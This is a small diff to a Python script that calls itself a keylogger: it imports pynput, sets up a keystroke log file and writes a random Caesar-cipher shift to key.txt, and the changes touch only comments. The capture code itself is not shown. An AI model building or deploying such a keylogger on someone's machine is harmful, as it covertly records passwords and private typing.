@@ -1,3 +1,4 @@
+#This is the keylogger but encrypts the captured keystrokes using a Caesar cipher before saving them to a file.
 from pynput import keyboard
 import time
 import threading
@@ -9,7 +10,7 @@ SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
 LOG_FILE = os.path.join(SCRIPT_DIR, "keystrokes.log")
 KEY_FILE = os.path.join(SCRIPT_DIR, "key.txt")
 
-# Generate a fresh key for this session and store it
+# Generate a fresh key for this session and store it in key.txt
 SHIFT = random.randint(1, 25)
 with open(KEY_FILE, "w") as f:
     f.write(str(SHIFT))
